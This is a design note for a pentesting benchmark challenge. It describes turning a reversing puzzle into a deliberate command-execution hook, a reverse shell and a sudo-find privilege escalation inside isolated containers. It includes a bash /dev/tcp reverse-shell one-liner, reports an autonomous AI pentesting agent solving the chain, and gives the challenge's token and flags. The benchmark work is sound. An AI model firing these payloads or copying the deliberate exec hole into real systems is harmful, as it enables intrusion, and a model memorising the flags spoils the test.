# reverse-silver: reversing → real RCE → reverse shell → privesc escalation

> **Status**: Implemented, verified live, shipped
> **Date**: 2026-07-08

---

## Problem

`/reverse/silver` only tested reversing (byte permutation + rotate + xor). Solving it
returned the flag directly over HTTP. That is not enough to exercise a real
reverse-shell/pentesting tool — no shell ever needs to be popped.

`scripts/verify-isolated-compose.js` hard-gates the benchmark at exactly 40 challenge
services/ports/flags, so adding a 41st container was not an option. The escalation had
to happen in place, inside the existing `reverse-silver` service.

## Design

1. The reversing puzzle itself is unchanged — recover the `REV{...}` token from
   `/reverse/silver/artifact.js` (permutation + rotate + xor, plaintext token never
   appears in source, only derivable from `encodedHex` + `order`).
2. Submitting the correct token no longer issues the flag. It unlocks a debug hook:
   `POST /reverse/silver/debug` with header `X-Debug-Token: <token>` and JSON body
   `{"cmd": "..."}`. Unlike every other challenge in this benchmark (which simulate
   exploitation via string matching), this one actually runs the command via
   `child_process.exec` — a deliberate, isolated exception.
3. The moment the token is first accepted, the flag file is written and then locked
   to `root:root 0400` using the `sudo find` GTFOBins entry that is already baked
   into the shared image for the `privesc` challenge (`app/Dockerfile`). `ctfuser`
   (where the RCE lands) can no longer read it directly — a real privilege
   escalation, from a real shell, is required.
4. `scripts/generate-isolated-compose.js` adds `extra_hosts: host.docker.internal:host-gateway`
   for the `reverse-silver` service only, so a reverse-shell payload fired through
   the debug hook can call back to a listener on the host.

## Verification

`scripts/check-reverse-compose.js` was extended to check the full chain against a
real docker compose stack:

- debug hook auth: missing token / wrong token → 403, missing `cmd` → 400
- `whoami` via the debug hook returns `ctfuser`
- direct `cat` of the flag file is denied (`Permission denied`) — proves the lock
- `sudo find <flag> -maxdepth 0 -exec cat {} \;` via the debug hook returns the
  real flag, matched against the `FLAG=` value baked into `docker-compose.yml`
- a real reverse shell: the script starts a throwaway Node `net.createServer()`
  listener, fires a backgrounded/disowned `bash -i >& /dev/tcp/host.docker.internal/<port> 0>&1`
  payload through the debug hook, and waits for the actual TCP connection —
  no sidecar binary required
- direct-port and web-proxy parity (unchanged from before)

`npm run check` passes end to end against real docker compose; `docker ps` shows no
leftover containers afterward.

## Live agent verification (beyond the self-contained check script)

The chain was additionally solved twice by the actual `pentesting` CLI running as a
headless autonomous agent (not scripted by hand) against a live compose stack, with
only the target URL given — no token, no exploit steps, no privesc technique. Both
runs reverse-engineered the artifact themselves and recovered `REV{CLIENT_SIDE_VM_7F3A}`.
The second run (after a fix on the `pentesting` side — see that repo's
`docs/plans/2026/07/08/001_1537_...md` and `002_0834_...md`) drove the real popped
reverse-shell session through the agent's `session_control` tool (list, tag, and
`run` for the privesc read) rather than falling back to the HTTP debug channel,
and recovered `FLAG{REVERSE_🥈_ADVANCED_6EC50A}`.

## Shipped

- `app/isolated/challenges.js`, `scripts/check-reverse-compose.js`,
  `scripts/generate-isolated-compose.js`, `scripts/verify-isolated-compose.js`,
  `docker-compose.yml`, `docker-compose-40.yml`
- Commit `980e085`, pushed to `origin/main`.

## Open follow-up

`SHARED_CORE_SYNC.md` asks for these core-runtime changes to be mirrored into the
sibling `../vulnerable` (RnDSecurity monorepo) checkout. That sibling directory does
not exist in this environment, so the mirror step could not be performed here — it
needs to happen from a workspace that has both checkouts.
